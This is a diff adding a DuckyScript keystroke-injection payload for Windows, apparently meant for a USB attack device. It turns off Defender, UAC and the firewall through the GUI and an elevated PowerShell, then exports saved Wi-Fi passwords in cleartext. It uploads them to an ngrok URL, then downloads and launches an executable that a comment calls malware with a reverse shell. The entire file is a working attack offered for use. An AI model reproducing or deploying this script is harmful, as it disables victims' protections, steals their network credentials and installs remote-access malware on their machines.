@@ -1,0 +1,96 @@
+REM Disabling Virus and threat protection
+GUI
+DELAY 3000
+STRING Virus & threat protection
+DELAY 1000
+ENTER
+DELAY 3000
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+REM Disabling Real Time Protection
+TAB
+DELAY 200
+ENTER
+DELAY 1000
+SPACE
+DELAY 500
+ALT y
+DELAY 100
+REM DISABLING ALL 4 TYPE OF PROTECTION
+TAB
+DELAY 100
+SPACE
+DELAY 500
+ALT y
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 500
+ALT y
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 500
+ALT y
+DELAY 100
+ALT F4
+DELAY 400 
+REM Automate Turn-Off - Windows UAC, Windows Firewall, and Windows Defender
+REM Also automate to Download the malware and connect with Reverse Shell
+GUI r
+DELAY 500
+REM Open the Powershell as Administrator
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+LEFT
+DELAY 100
+ENTER
+DELAY 1000
+REM Disabling the UAC
+STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+ENTER
+DELAY 600
+REM Disabling the Firewall Part 1
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 600
+REM Disabling the Firewall Part 2
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 600
+REM Disabling the Virus and Threat Protection
+STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+ENTER
+DELAY 600
+REM exporting the saved wifi passwords
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 600
+REM Zipping all the saved wifi passwords
+STRING Compress-Archive -U .\*.xml -DestinationPath temp.zip
+ENTER
+DELAY 600
+REM Uploading the passwords to SimpleHttpServer(Note:- Change -Uri to your own custom ngrok link)
+STRING Invoke-Restmethod -Uri https://8512-34-143-164-120.ap.ngrok.io/wpg/temp.zip -Method Put -Infile .\temp.zip
+ENTER
+DELAY 700
+STRING Invoke-WebRequest -Uri https://f79e-146-196-34-146.in.ngrok.io/dorega.exe -OutFile C:\dorega.exe
+DELAY 100
+ENTER
+DELAY 700
+STRING Start-Process C:\dorega.exe
+DELAY 100
+ENTER
+
+
+
+
+ 
+
